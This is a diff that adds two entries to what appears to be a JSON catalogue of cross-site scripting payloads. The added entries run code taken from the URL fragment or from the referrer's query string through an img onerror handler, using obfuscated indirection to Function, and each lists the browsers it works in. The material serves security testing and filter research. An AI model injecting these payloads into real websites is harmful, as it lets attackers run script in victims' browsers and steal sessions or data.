@@ -68,5 +68,25 @@
             "edge",
             "safari"
         ]
+    },
+    {
+        "description": "Code in URI fragment",
+        "code": "<img src=x data-a=defaultView data-b=Function onerror=ownerDocument[dataset.a][dataset.b](ownerDocument[dataset.a].location.hash.substring(1))()>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Code in referrer query string",
+        "code": "<img src=x data-a=defaultView data-b=Function onerror=ownerDocument[dataset.a][dataset.b](ownerDocument[dataset.a].URL.parse(ownerDocument.referrer).search.substring(1))()>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
     }
 ]
